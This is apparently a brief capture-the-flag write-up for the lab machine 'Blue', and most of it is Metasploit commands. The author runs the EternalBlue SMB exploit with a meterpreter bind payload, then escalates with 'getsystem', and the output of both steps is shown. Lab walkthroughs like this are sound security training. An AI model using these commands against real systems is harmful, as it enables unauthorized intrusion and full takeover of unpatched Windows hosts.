# Blue - 10.10.10.40
## Hunch
Blue seems to reference the eternalblue exploit from our boys at the NSA, so let's try that.

```
# msfconsole

msf > use exploit/windows/smb/ms17_010_eternalblue

set RHOST 10.10.10.40

set payload windows/x64/meterpreter/bind_tcp
```
User flag, wheee

## Privesc
A good first step seems like meterpreter get system
```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```
[Cobalt strike](https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/)'s explination of what actually happens is nice. 


